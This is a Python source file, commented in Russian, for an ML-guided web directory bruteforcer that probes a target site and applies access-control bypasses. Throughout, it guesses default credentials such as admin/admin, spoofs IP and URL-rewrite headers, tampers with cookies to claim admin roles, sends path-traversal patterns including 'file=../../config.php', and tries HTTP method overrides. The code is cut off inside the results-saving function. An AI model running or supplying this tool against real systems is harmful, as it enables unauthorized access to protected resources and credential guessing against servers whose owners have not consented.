#!/usr/bin/env python3
"""
Smart Directory Bruteforce Script
Использует TapTransformer модель для предсказания техник обхода защиты
"""

import requests
import torch
import json
import time
import argparse
import logging
from urllib.parse import urljoin
from typing import Dict, List, Tuple, Optional, Any
import re
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
import pickle

# Импорт нашей TapTransformer модели
try:
    from tap_transformer_model import TapTransformer
    from sklearn.preprocessing import LabelEncoder, StandardScaler, MultiLabelBinarizer
    TAP_TRANSFORMER_AVAILABLE = True
except ImportError as e:
    print(f"Предупреждение: TapTransformer недоступен ({e})")
    print("Работаем в демо-режиме с эвристическими правилами")
    TAP_TRANSFORMER_AVAILABLE = False

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('smart_bruteforce.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    """Результат сканирования одного пути"""
    url: str
    path: str
    status_code: int
    response_time: float
    content_length: int
    headers: Dict[str, str]
    content: str
    anomaly_type: str
    features: Dict[str, Any]
    predicted_techniques: List[str]
    technique_probabilities: Dict[str, float]
    applied_techniques: List[str] = None
    success: bool = False


class SmartBruteforcer:
    """Умный брутфорсер директорий с использованием TapTransformer"""
    
    def __init__(
        self,
        model_path: str = 'best_model.pth',
        encoders_path: str = 'encoders.pkl',
        wordlist_path: str = 'wordlists.txt',
        threads: int = 10,
        delay: float = 0.1,
        timeout: int = 10
    ):
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Загрузка словаря путей
        self.wordlist = self.load_wordlist(wordlist_path)
        logger.info(f"Загружено {len(self.wordlist)} путей из словаря")
        
        # Загрузка модели и энкодеров
        self.model, self.encoders = self.load_model_and_encoders(model_path, encoders_path)
        logger.info("Модель и энкодеры загружены")
        
        # Статистика
        self.stats = {
            'total_requests': 0,
            'anomalies_found': 0,
            'techniques_applied': 0,
            'successful_bypasses': 0
        }
        
        # Техники обхода
        self.bypass_techniques = {
            'TB_HEADER_BYPASS': self.apply_header_bypass,
            'TB_AUTH_ATTEMPT': self.apply_auth_attempt,
            'TB_REDIRECT_FOLLOW': self.apply_redirect_follow,
            'TB_PARAM_FUZZ': self.apply_param_fuzz,
            'TB_PATH_VARIATION': self.apply_path_variation,
            'TB_COOKIE_TWEAK': self.apply_cookie_tweak,
            'TB_RATE_CONTROL': self.apply_rate_control,
            'TB_DIRECT_ACCESS': self.apply_direct_access,
            # Новые умные техники
            'TB_SMART_PATH_MUTATION': self.apply_smart_path_mutation,
            'TB_NGINX_BYPASS': self.apply_nginx_bypass,
            'TB_PARAMETER_INJECTION': self.apply_parameter_injection,
            'TB_STATUS_MANIPULATION': self.apply_status_manipulation,
            'TB_CONTEXT_INFERENCE': self.apply_context_inference
        }
        
        # Кэш для контекстного анализа
        self.discovered_paths = set()
        self.path_patterns = {}
        self.response_patterns = {}
        
        # Умные мутации путей
        self.smart_mutations = {
            'plural_forms': self.generate_plural_forms,
            'context_variations': self.generate_context_variations,
            'parameter_variations': self.generate_parameter_variations,
            'smart_parameters': self.generate_smart_parameters
        }
    
    def load_wordlist(self, path: str) -> List[str]:
        """Загрузка словаря путей"""
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logger.error(f"Файл словаря {path} не найден")
            return []
    
    def load_model_and_encoders(self, model_path: str, encoders_path: str) -> Tuple[Optional[Any], Optional[Dict]]:
        """Загрузка обученной модели и энкодеров"""
        if not TAP_TRANSFORMER_AVAILABLE:
            logger.warning("TapTransformer недоступен - используется демо-режим")
            return None, None
            
        try:
            # Проверка существования файлов
            import os
            if not os.path.exists(model_path) or not os.path.exists(encoders_path):
                logger.warning(f"Файлы модели не найдены - используется демо-режим")
                return None, None
            
            # Загрузка энкодеров
            with open(encoders_path, 'rb') as f:
                encoders = pickle.load(f)
            
            # Создание модели с теми же параметрами
            categorical_features = {
                'anomaly_type': len(encoders['categorical']['anomaly_type'].classes_),
                'encoding_type': len(encoders['categorical']['encoding_type'].classes_),
                'error_message': len(encoders['categorical']['error_message'].classes_)
            }
            
            numerical_features = [
                'status', 'depth', 'size', 'response_time_ms', 'retry_after_seconds',
                'has_location', 'has_set_cookie', 'has_www_authenticate', 
                'has_retry_after', 'has_auth_token', 'has_cookie', 'has_x_custom_auth',
                'error_text_present', 'content_fingerprint_hash'
            ]
            
            num_techniques = len(encoders['technique'].classes_)
            
            model = TapTransformer(
                categorical_features=categorical_features,
                numerical_features=numerical_features,
                num_techniques=num_techniques,
                d_model=128,
                n_heads=8,
                n_layers=4,
                d_ff=512,
                dropout=0.1,
                embedding_dim=32
            )
            
            # Загрузка весов модели
            model.load_state_dict(torch.load(model_path, map_location='cpu'))
            model.eval()
            
            logger.info("TapTransformer модель успешно загружена")
            return model, encoders
            
        except Exception as e:
            logger.error(f"Ошибка загрузки модели: {e}")
            logger.warning("Переключаемся на демо-режим")
            return None, None
    
    def make_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[requests.Response]:
        """Выполнение HTTP запроса с обработкой ошибок"""
        try:
            response = self.session.request(
                method=method,
                url=url,
                timeout=self.timeout,
                allow_redirects=False,
                **kwargs
            )
            self.stats['total_requests'] += 1
            return response
        except requests.exceptions.RequestException as e:
            logger.debug(f"Ошибка запроса к {url}: {e}")
            return None
    
    def extract_features(self, response: requests.Response, url: str, path: str) -> Dict[str, Any]:
        """Извлечение признаков из HTTP ответа"""
        features = {
            'status': response.status_code,
            'depth': len(path.strip('/').split('/')) if path.strip('/') else 1,
            'size': len(response.content),
            'response_time_ms': response.elapsed.total_seconds() * 1000,
            'retry_after_seconds': 0,
            'has_location': int('location' in response.headers),
            'has_set_cookie': int('set-cookie' in response.headers),
            'has_www_authenticate': int('www-authenticate' in response.headers),
            'has_retry_after': int('retry-after' in response.headers),
            'has_auth_token': int(any('token' in h.lower() for h in response.headers.values())),
            'has_cookie': int('cookie' in response.headers),
            'has_x_custom_auth': int(any(h.startswith('x-') and 'auth' in h.lower() for h in response.headers)),
            'error_text_present': int(self.has_error_text(response.text)),
            'content_fingerprint_hash': hash(response.text[:1000]) % 10000,
            'encoding_type': 'none',
            'error_message': 'none'
        }
        
        # Обработка retry-after
        if 'retry-after' in response.headers:
            try:
                features['retry_after_seconds'] = int(response.headers['retry-after'])
            except ValueError:
                features['retry_after_seconds'] = 60
        
        # Определение типа кодировки
        if '%' in path:
            features['encoding_type'] = 'URL-encoded'
        elif '..' in path:
            features['encoding_type'] = 'Path-traversal'
        elif path.endswith('.'):
            features['encoding_type'] = 'Trailing-dot'
        
        # Определение сообщения об ошибке
        if response.status_code == 403:
            features['error_message'] = 'Forbidden'
        elif response.status_code == 401:
            features['error_message'] = 'Unauthorized'
        elif response.status_code == 404:
            features['error_message'] = 'Not Found'
        elif response.status_code >= 500:
            features['error_message'] = 'Server Error'
        
        return features
    
    def has_error_text(self, content: str) -> bool:
        """Проверка наличия текста ошибки в содержимом"""
        error_patterns = [
            r'error', r'forbidden', r'unauthorized', r'access denied',
            r'not found', r'server error', r'exception', r'stack trace'
        ]
        content_lower = content.lower()
        return any(re.search(pattern, content_lower) for pattern in error_patterns)
    
    def detect_anomaly_type(self, response: requests.Response, baseline_response: Optional[requests.Response] = None) -> str:
        """Определение типа аномалии"""
        if response.status_code in [301, 302, 303, 307, 308]:
            return 'REDIRECT_ANOMALY'
        elif response.status_code == 429:
            return 'RATE_LIMIT_ANOMALY'
        elif response.status_code in [401, 403] and 'www-authenticate' in response.headers:
            return 'AUTH_ANOMALY'
        elif 'set-cookie' in response.headers:
            return 'COOKIE_ANOMALY'
        elif response.elapsed.total_seconds() > 2.0:
            return 'TIME_ANOMALY'
        elif len(response.content) > 100000:  # Большой размер ответа
            return 'SIZE_ANOMALY'
        elif response.status_code in [500, 501, 502, 503, 504, 505]:
            return 'SERVER_ERROR'
        elif response.status_code not in [200, 404]:
            return 'STATUS_ANOMALY'
        elif self.has_error_text(response.text):
            return 'CONTENT_ANOMALY'
        else:
            return 'STATUS_ANOMALY'  # По умолчанию
    
    def predict_techniques(self, features: Dict[str, Any], anomaly_type: str) -> Tuple[List[str], Dict[str, float]]:
        """Предсказание техник обхода с помощью модели"""
        if self.model is None or self.encoders is None:
            # Демо-режим: простая эвристика
            return self.demo_predict_techniques(features, anomaly_type)
        
        try:
            # Подготовка данных для модели
            categorical_data = {
                'anomaly_type': anomaly_type,
                'encoding_type': features.get('encoding_type', 'none'),
                'error_message': features.get('error_message', 'none')
            }
            
            # Кодирование категориальных признаков
            categorical_inputs = {}
            for feature, value in categorical_data.items():
                encoder = self.encoders['categorical'][feature]
                try:
                    encoded = encoder.transform([str(value)])[0]
                except ValueError:
                    encoded = 0  # Неизвестное значение
                categorical_inputs[feature] = torch.LongTensor([encoded])
            
            # Подготовка числовых признаков
            numerical_features = [
                'status', 'depth', 'size', 'response_time_ms', 'retry_after_seconds',
                'has_location', 'has_set_cookie', 'has_www_authenticate', 
                'has_retry_after', 'has_auth_token', 'has_cookie', 'has_x_custom_auth',
                'error_text_present', 'content_fingerprint_hash'
            ]
            
            numerical_data = [features.get(f, 0) for f in numerical_features]
            numerical_inputs = torch.FloatTensor([numerical_data])
            
            # Нормализация
            numerical_inputs = torch.FloatTensor(
                self.encoders['numerical'].transform(numerical_inputs.numpy())
            )
            
            # Предсказание
            with torch.no_grad():
                logits = self.model(categorical_inputs, numerical_inputs)
                probabilities = torch.sigmoid(logits).squeeze().numpy()
            
            # Получение техник с вероятностью > 0.5
            technique_names = self.encoders['technique'].classes_
            predicted_techniques = []
            technique_probabilities = {}
            
            for i, prob in enumerate(probabilities):
                technique = technique_names[i]
                technique_probabilities[technique] = float(prob)
                if prob > 0.5:
                    predicted_techniques.append(technique)
            
            logger.debug(f"TapTransformer предсказал: {predicted_techniques}")
            return predicted_techniques, technique_probabilities
            
        except Exception as e:
            logger.error(f"Ошибка предсказания TapTransformer: {e}")
            # Fallback на демо-режим
            return self.demo_predict_techniques(features, anomaly_type)
    
    def demo_predict_techniques(self, features: Dict[str, Any], anomaly_type: str) -> Tuple[List[str], Dict[str, float]]:
        """Демо-предсказание техник на основе эвристики"""
        techniques = []
        probabilities = {}
        
        # Эвристические правила для базовых техник
        if anomaly_type == 'AUTH_ANOMALY' or features['status'] in [401, 403]:
            techniques.extend(['TB_AUTH_ATTEMPT', 'TB_HEADER_BYPASS', 'TB_NGINX_BYPASS'])
            probabilities.update({
                'TB_AUTH_ATTEMPT': 0.8, 
                'TB_HEADER_BYPASS': 0.7,
                'TB_NGINX_BYPASS': 0.6
            })
        
        if anomaly_type == 'REDIRECT_ANOMALY':
            techniques.append('TB_REDIRECT_FOLLOW')
            probabilities['TB_REDIRECT_FOLLOW'] = 0.9
        
        if anomaly_type == 'RATE_LIMIT_ANOMALY':
            techniques.append('TB_RATE_CONTROL')
            probabilities['TB_RATE_CONTROL'] = 0.8
        
        if anomaly_type == 'COOKIE_ANOMALY':
            techniques.append('TB_COOKIE_TWEAK')
            probabilities['TB_COOKIE_TWEAK'] = 0.7
        
        # Обработка серверных ошибок (503, 500, 502, etc.)
        if anomaly_type == 'SERVER_ERROR' or features['status'] in [500, 501, 502, 503, 504, 505]:
            techniques.extend([
                'TB_HEADER_BYPASS',
                'TB_NGINX_BYPASS', 
                'TB_PARAMETER_INJECTION',
                'TB_STATUS_MANIPULATION',
                'TB_RATE_CONTROL'
            ])
            probabilities.update({
                'TB_HEADER_BYPASS': 0.8,
                'TB_NGINX_BYPASS': 0.7,
                'TB_PARAMETER_INJECTION': 0.6,
                'TB_STATUS_MANIPULATION': 0.5,
                'TB_RATE_CONTROL': 0.4
            })
        
        if features['status'] == 404:
            techniques.extend([
                'TB_PATH_VARIATION', 
                'TB_PARAM_FUZZ',
                'TB_SMART_PATH_MUTATION',
                'TB_PARAMETER_INJECTION'
            ])
            probabilities.update({
                'TB_PATH_VARIATION': 0.6, 
                'TB_PARAM_FUZZ': 0.5,
                'TB_SMART_PATH_MUTATION': 0.8,
                'TB_PARAMETER_INJECTION': 0.7
            })
        
        if features['status'] == 405:  # Method Not Allowed
            techniques.extend(['TB_DIRECT_ACCESS', 'TB_STATUS_MANIPULATION'])
            probabilities.update({
                'TB_DIRECT_ACCESS': 0.7,
                'TB_STATUS_MANIPULATION': 0.6
            })
        
        # Всегда добавляем контекстный анализ для любых аномалий
        if anomaly_type != 'NORMAL':
            techniques.append('TB_CONTEXT_INFERENCE')
            probabilities['TB_CONTEXT_INFERENCE'] = 0.5
        
        return techniques, probabilities
    
    def scan_path(self, base_url: str, path: str) -> ScanResult:
        """Сканирование одного пути"""
        url = urljoin(base_url, path)
        
        # Базовый запрос
        response = self.make_request(url)
        if response is None:
            return ScanResult(
                url=url, path=path, status_code=0, response_time=0,
                content_length=0, headers={}, content="",
                anomaly_type="CONNECTION_ERROR", features={},
                predicted_techniques=[], technique_probabilities={}
            )
        
        # Извлечение признаков
        features = self.extract_features(response, url, path)
        anomaly_type = self.detect_anomaly_type(response)
        
        # Предсказание техник
        predicted_techniques, technique_probabilities = self.predict_techniques(features, anomaly_type)
        
        # Создание результата
        result = ScanResult(
            url=url,
            path=path,
            status_code=response.status_code,
            response_time=response.elapsed.total_seconds(),
            content_length=len(response.content),
            headers=dict(response.headers),
            content=response.text[:1000],  # Первые 1000 символов
            anomaly_type=anomaly_type,
            features=features,
            predicted_techniques=predicted_techniques,
            technique_probabilities=technique_probabilities
        )
        
        # Применение техник обхода
        if predicted_techniques:
            self.stats['anomalies_found'] += 1
            result.applied_techniques = self.apply_bypass_techniques(result)
        
        return result
    
    def apply_bypass_techniques(self, result: ScanResult) -> List[str]:
        """Применение техник обхода"""
        applied_techniques = []
        
        for technique in result.predicted_techniques:
            if technique in self.bypass_techniques:
                logger.info(f"Применяем технику {technique} для {result.path}")
                
                try:
                    success = self.bypass_techniques[technique](result)
                    if success:
                        applied_techniques.append(technique)
                        self.stats['techniques_applied'] += 1
                        self.stats['successful_bypasses'] += 1
                        result.success = True
                        logger.info(f"✓ Техника {technique} успешно применена")
                    else:
                        logger.debug(f"✗ Техника {technique} не сработала")
                except Exception as e:
                    logger.error(f"Ошибка применения техники {technique}: {e}")
        
        return applied_techniques
    
    def apply_header_bypass(self, result: ScanResult) -> bool:
        """Обход с помощью заголовков"""
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Forwarded-Proto': 'https'},
            {'X-Rewrite-URL': result.path},
            {'X-Original-URL': result.path},
            {'X-Override-URL': result.path},
            {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'}
        ]
        
        for headers in bypass_headers:
            response = self.make_request(result.url, headers=headers)
            if response and response.status_code != result.status_code:
                logger.info(f"Обход заголовками: {headers} -> {response.status_code}")
                return True
        
        return False
    
    def apply_auth_attempt(self, result: ScanResult) -> bool:
        """Попытка аутентификации"""
        auth_attempts = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('user', 'user'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('', ''),  # Пустые учетные данные
        ]
        
        for username, password in auth_attempts:
            # Basic Auth
            response = self.make_request(result.url, auth=(username, password))
            if response and response.status_code != result.status_code:
                logger.info(f"Успешная аутентификация: {username}:{password}")
                return True
        
        return False
    
    def apply_redirect_follow(self, result: ScanResult) -> bool:
        """Следование редиректам"""
        if result.status_code in [301, 302, 303, 307, 308]:
            location = result.headers.get('location')
            if location:
                response = self.make_request(location)
                if response and response.status_code == 200:
                    logger.info(f"Успешное следование редиректу: {location}")
                    return True
        
        return False
    
    def apply_param_fuzz(self, result: ScanResult) -> bool:
        """Фаззинг параметров"""
        common_params = [
            '?debug=1',
            '?admin=1',
            '?test=1',
            '?dev=1',
            '?show=all',
            '?format=json',
            '?callback=test',
            '?source=1',
            '?raw=1'
        ]
        
        for param in common_params:
            test_url = result.url + param
            response = self.make_request(test_url)
            if response and response.status_code != result.status_code:
                logger.info(f"Успешный фаззинг параметров: {param}")
                return True
        
        return False
    
    def apply_path_variation(self, result: ScanResult) -> bool:
        """Вариации пути"""
        path_variations = [
            result.path + '/',
            result.path + '..',
            result.path + '.',
            result.path.upper(),
            result.path.lower(),
            result.path + '.bak',
            result.path + '.old',
            result.path + '~',
            result.path.replace('/', '\\'),
            result.path.replace('/', '%2f'),
            result.path + '%00',
            result.path + ';',
            result.path + '#',
            result.path + '?'
        ]
        
        base_url = result.url.replace(result.path, '')
        
        for variation in path_variations:
            test_url = urljoin(base_url, variation)
            response = self.make_request(test_url)
            if response and response.status_code != result.status_code:
                logger.info(f"Успешная вариация пути: {variation}")
                return True
        
        return False
    
    def apply_cookie_tweak(self, result: ScanResult) -> bool:
        """Манипуляция с cookies"""
        cookie_attempts = [
            {'admin': '1'},
            {'debug': '1'},
            {'test': '1'},
            {'role': 'admin'},
            {'user': 'admin'},
            {'auth': '1'},
            {'logged_in': '1'},
            {'session': 'admin'},
            {'token': '1'}
        ]
        
        for cookies in cookie_attempts:
            response = self.make_request(result.url, cookies=cookies)
            if response and response.status_code != result.status_code:
                logger.info(f"Успешная манипуляция cookies: {cookies}")
                return True
        
        return False
    
    def apply_rate_control(self, result: ScanResult) -> bool:
        """Контроль скорости запросов"""
        if result.status_code == 429:
            # Ждем и повторяем запрос
            wait_time = result.features.get('retry_after_seconds', 60)
            logger.info(f"Ожидание {wait_time} секунд из-за rate limit")
            time.sleep(min(wait_time, 10))  # Максимум 10 секунд
            
            response = self.make_request(result.url)
            if response and response.status_code != 429:
                logger.info("Успешный обход rate limit")
                return True
        
        return False
    
    def apply_direct_access(self, result: ScanResult) -> bool:
        """Прямой доступ"""
        # Попытка POST запроса
        response = self.make_request(result.url, method='POST')
        if response and response.status_code != result.status_code:
            logger.info(f"Успешный POST запрос: {response.status_code}")
            return True
        
        # Попытка PUT запроса
        response = self.make_request(result.url, method='PUT')
        if response and response.status_code != result.status_code:
            logger.info(f"Успешный PUT запрос: {response.status_code}")
            return True
        
        return False
    
    # ===========================================
    # НОВЫЕ УМНЫЕ ТЕХНИКИ ОБХОДА
    # ===========================================
    
    def apply_smart_path_mutation(self, result: ScanResult) -> bool:
        """Умная мутация путей на основе контекста"""
        base_url = result.url.replace(result.path, '')
        path = result.path.strip('/')
        
        # Сохраняем найденный путь для анализа
        self.discovered_paths.add(path)
        
        # Генерируем умные мутации
        mutations = []
        
        # 1. Множественные формы
        mutations.extend(self.generate_plural_forms(path))
        
        # 2. Контекстные вариации
        mutations.extend(self.generate_context_variations(path))
        
        # 3. Параметрические вариации
        mutations.extend(self.generate_parameter_variations(path))
        
        # Тестируем мутации
        for mutation in mutations[:20]:  # Ограничиваем количество
            test_url = urljoin(base_url, mutation)
            response = self.make_request(test_url)
            if response and self.is_interesting_response(response, result):
                logger.info(f"🧠 Умная мутация успешна: {mutation}")
                return True
        
        return False
    
    def apply_nginx_bypass(self, result: ScanResult) -> bool:
        """Обход Nginx proxy через статические файлы"""
        base_url = result.url.replace(result.path, '')
        path = result.path.strip('/')
        
        # Nginx bypass техники
        bypass_patterns = [
            f"static/../{path}",
            f"assets/../{path}",
            f"public/../{path}",
            f"files/../{path}",
            f"uploads/../{path}",
            f"images/../{path}",
            f"css/../{path}",
            f"js/../{path}",
            f"media/../{path}",
            f"content/../{path}",
            f"static/..;/{path}",
            f"assets/..;/{path}",
            f"public/..;/{path}",
            f"/static/../{path}",
            f"/assets/../{path}",
            f"/public/../{path}",
            f"//static/../{path}",
            f"//assets/../{path}",
            f"//public/../{path}",
            f"./static/../{path}",
            f"./assets/../{path}",
            f"./public/../{path}",
            f"%2fstatic%2f..%2f{path}",
            f"%2fassets%2f..%2f{path}",
            f"%2fpublic%2f..%2f{path}",
        ]
        
        for bypass in bypass_patterns:
            test_url = urljoin(base_url, bypass)
            response = self.make_request(test_url)
            if response and self.is_interesting_response(response, result):
                logger.info(f"🚀 Nginx bypass успешен: {bypass}")
                return True
        
        return False
    
    def apply_parameter_injection(self, result: ScanResult) -> bool:
        """Инъекция параметров в URL"""
        base_url = result.url.replace(result.path, '')
        path = result.path.strip('/')
        
        # Умные параметры на основе контекста
        smart_params = self.generate_smart_parameters(path)
        
        for params in smart_params:
            # Добавляем параметры к URL
            test_url = f"{urljoin(base_url, path)}?{params}"
            response = self.make_request(test_url)
            if response and self.is_interesting_response(response, result):
                logger.info(f"💉 Параметр инъекция успешна: {params}")
                return True
        
        return False
    
    def apply_status_manipulation(self, result: ScanResult) -> bool:
        """Манипуляция для получения разных статус-кодов"""
        base_url = result.url.replace(result.path, '')
        path = result.path.strip('/')
        
        # Техники для изменения статус-кодов
        manipulations = [
            # HTTP методы
            ('POST', {}),
            ('PUT', {}),
            ('DELETE', {}),
            ('PATCH', {}),
            ('HEAD', {}),
            ('OPTIONS', {}),
            ('TRACE', {}),
            
            # Заголовки для обхода
            ('GET', {'X-HTTP-Method-Override': 'POST'}),
            ('GET', {'X-HTTP-Method-Override': 'PUT'}),
            ('GET', {'X-HTTP-Method-Override': 'DELETE'}),
            ('GET', {'X-Method-Override': 'POST'}),
            ('GET', {'X-Method-Override': 'PUT'}),
            ('GET', {'X-Method-Override': 'DELETE'}),
            
            # Content-Type манипуляции
            ('POST', {'Content-Type': 'application/json'}),
            ('POST', {'Content-Type': 'application/xml'}),
            ('POST', {'Content-Type': 'text/plain'}),
            ('POST', {'Content-Type': 'multipart/form-data'}),
            
            # Accept заголовки
            ('GET', {'Accept': 'application/json'}),
            ('GET', {'Accept': 'application/xml'}),
            ('GET', {'Accept': 'text/xml'}),
            ('GET', {'Accept': 'text/plain'}),
            ('GET', {'Accept': '*/*'}),
        ]
        
        for method, headers in manipulations:
            test_url = urljoin(base_url, path)
            response = self.make_request(test_url, method=method, headers=headers)
            if response and self.is_interesting_response(response, result):
                logger.info(f"🔄 Статус манипуляция успешна: {method} {headers}")
                return True
        
        return False
    
    def apply_context_inference(self, result: ScanResult) -> bool:
        """Контекстный вывод новых путей"""
        base_url = result.url.replace(result.path, '')
        path = result.path.strip('/')
        
        # Анализируем контекст и выводим новые пути
        inferred_paths = self.infer_paths_from_context(path)
        
        for inferred_path in inferred_paths[:10]:  # Ограничиваем количество
            test_url = urljoin(base_url, inferred_path)
            response = self.make_request(test_url)
            if response and self.is_interesting_response(response, result):
                logger.info(f"🔮 Контекстный вывод успешен: {inferred_path}")
                return True
        
        return False
    
    # ===========================================
    # ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ ДЛЯ УМНЫХ ТЕХНИК
    # ===========================================
    
    def generate_plural_forms(self, path: str) -> List[str]:
        """Генерация множественных форм"""
        variations = []
        
        # Простые правила для английского
        if path.endswith('y'):
            variations.append(path[:-1] + 'ies')
        elif path.endswith(('s', 'sh', 'ch', 'x', 'z')):
            variations.append(path + 'es')
        else:
            variations.append(path + 's')
        
        # Обратные формы (из множественного в единственное)
        if path.endswith('ies'):
            variations.append(path[:-3] + 'y')
        elif path.endswith('es'):
            variations.append(path[:-2])
        elif path.endswith('s') and not path.endswith('ss'):
            variations.append(path[:-1])
        
        return variations
    
    def generate_context_variations(self, path: str) -> List[str]:
        """Генерация контекстных вариаций"""
        variations = []
        
        # Если путь содержит 'user', добавляем связанные пути
        if 'user' in path.lower():
            variations.extend([
                path.replace('user', 'users'),
                path.replace('user', 'admin'),
                path.replace('user', 'profile'),
                path.replace('user', 'account'),
                path.replace('user', 'member'),
                path.replace('user', 'client'),
            ])
        
        # Если путь содержит 'admin', добавляем связанные пути
        if 'admin' in path.lower():
            variations.extend([
                path.replace('admin', 'administrator'),
                path.replace('admin', 'management'),
                path.replace('admin', 'manager'),
                path.replace('admin', 'control'),
                path.replace('admin', 'panel'),
            ])
        
        # Если путь содержит 'api', добавляем версии
        if 'api' in path.lower():
            variations.extend([
                path.replace('api', 'api/v1'),
                path.replace('api', 'api/v2'),
                path.replace('api', 'api/v3'),
                path.replace('api', 'rest'),
                path.replace('api', 'graphql'),
            ])
        
        return variations
    
    def generate_parameter_variations(self, path: str) -> List[str]:
        """Генерация параметрических вариаций"""
        variations = []
        
        # Добавляем расширения файлов
        extensions = ['.php', '.asp', '.aspx', '.jsp', '.do', '.action', '.html', '.htm', '.json', '.xml']
        for ext in extensions:
            variations.append(path + ext)
        
        # Добавляем индексные файлы
        variations.extend([
            f"{path}/index",
            f"{path}/index.php",
            f"{path}/index.html",
            f"{path}/default",
            f"{path}/default.php",
            f"{path}/default.html",
        ])
        
        return variations
    
    def generate_smart_parameters(self, path: str) -> List[str]:
        """Генерация умных параметров"""
        params = []
        
        # Базовые параметры
        basic_params = [
            "debug=1",
            "test=1",
            "admin=1",
            "dev=1",
            "trace=1",
            "verbose=1",
            "show_errors=1",
            "development=1",
        ]
        
        # ID параметры
        id_params = [
            "id=1",
            "id=0",
            "id=-1",
            "user_id=1",
            "user_id=0",
            "admin_id=1",
            "item_id=1",
            "page_id=1",
        ]
        
        # Контекстные параметры на основе пути
        if 'user' in path.lower():
            params.extend([
                "user=admin",
                "username=admin",
                "user_id=1",
                "uid=1",
                "u=admin",
            ])
        
        if 'admin' in path.lower():
            params.extend([
                "admin=1",
                "is_admin=1",
                "role=admin",
                "level=admin",
                "access=admin",
            ])
        
        if 'file' in path.lower():
            params.extend([
                "file=config.php",
                "file=../config.php",
                "file=../../config.php",
                "filename=config.php",
                "path=config.php",
            ])
        
        params.extend(basic_params)
        params.extend(id_params)
        
        return params
    
    def infer_paths_from_context(self, path: str) -> List[str]:
        """Вывод новых путей на основе контекста"""
        inferred = []
        
        # Анализируем структуру пути
        parts = path.split('/')
        
        # Если есть версия API
        if any('v' in part and part[1:].isdigit() for part in parts):
            for i in range(1, 6):  # v1-v5
                new_path = re.sub(r'v\d+', f'v{i}', path)
                if new_path != path:
                    inferred.append(new_path)
        
        # Если есть числовые ID
        if any(part.isdigit() for part in parts):
            for i in [0, 1, 2, 100, 1000]:
                new_path = re.sub(r'\d+', str(i), path)
                if new_path != path:
                    inferred.append(new_path)
        
        # Родительские директории
        if '/' in path:
            parent_path = '/'.join(parts[:-1])
            if parent_path:
                inferred.append(parent_path)
        
        # Дочерние директории
        common_subdirs = ['config', 'admin', 'test', 'debug', 'backup', 'old', 'new', 'temp']
        for subdir in common_subdirs:
            inferred.append(f"{path}/{subdir}")
        
        return inferred
    
    def is_interesting_response(self, response: requests.Response, baseline: ScanResult) -> bool:
        """Проверка, является ли ответ интересным"""
        # Разные статус-коды
        if response.status_code != baseline.status_code:
            return True
        
        # Значительно разная длина контента
        if abs(len(response.content) - baseline.content_length) > 100:
            return True
        
        # Разные заголовки
        if 'location' in response.headers and 'location' not in baseline.headers:
            return True
        
        # Успешные статус-коды
        if response.status_code in [200, 201, 202, 204, 301, 302, 307, 308]:
            return True
        
        # Ошибки аутентификации/авторизации
        if response.status_code in [401, 403]:
            return True
        
        return False
    
    def run_scan(self, base_url: str, max_paths: Optional[int] = None) -> List[ScanResult]:
        """Запуск сканирования"""
        logger.info(f"Начинаем сканирование {base_url}")
        logger.info(f"Потоков: {self.threads}, Задержка: {self.delay}s")
        
        paths_to_scan = self.wordlist[:max_paths] if max_paths else self.wordlist
        results = []
        
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Отправка задач
            future_to_path = {
                executor.submit(self.scan_path, base_url, path): path
                for path in paths_to_scan
            }
            
            # Сбор результатов
            for future in as_completed(future_to_path):
                path = future_to_path[future]
                try:
                    result = future.result()
                    results.append(result)
                    
                    # Логирование интересных результатов
                    if result.success:
                        techniques = result.applied_techniques or []
                        print(f"  🎯 УСПЕШНЫЙ ОБХОД: /{result.path} [{result.status_code}]")
                        print(f"     Техники: {', '.join(techniques[:3])}")
                        if len(techniques) > 3:
                            print(f"     + еще {len(techniques) - 3} техник...")
                    elif result.status_code == 200:
                        size = result.content_length
                        print(f"  🟢 ДОСТУПЕН: /{result.path} [{result.status_code}] ({size} байт)")
                    elif result.status_code in [301, 302]:
                        location = result.headers.get('location', '')
                        print(f"  🔄 РЕДИРЕКТ: /{result.path} [{result.status_code}] -> {location}")
                    elif result.status_code in [401, 403]:
                        print(f"  🔐 АВТОРИЗАЦИЯ: /{result.path} [{result.status_code}]")
                    elif result.status_code in [500, 502, 503]:
                        print(f"  🔴 ОШИБКА СЕРВЕРА: /{result.path} [{result.status_code}]")
                    elif result.predicted_techniques:
                        print(f"  🔍 АНОМАЛИЯ: /{result.path} [{result.status_code}] -> {result.predicted_techniques[:2]}")
                    
                    # Задержка между запросами
                    if self.delay > 0:
                        time.sleep(self.delay)
                        
                except Exception as e:
                    logger.error(f"Ошибка сканирования {path}: {e}")
        
        return results
    
    def save_results(self, results: List[ScanResult], filename: str = 'scan_results.json'):
        """Сохранение результатов в файл"""
        import json
        
        output_data = []
        
        for result in results:
            output_data.append({
                'url': result.url,
                'path': result.path,
                'status_code': result.status_code,
                'response_time': result.response_time,
                'content_length': result.content_length,
                'anomaly_type': result.anomaly_type,
                'predicted_techniques': result.predicted_techniques,
                'technique_probabilities': result.technique_probabilities,
                'applied_techniques': result.applied_techniques or [],
                'success': result.success,
                'features': result.features
            })
        
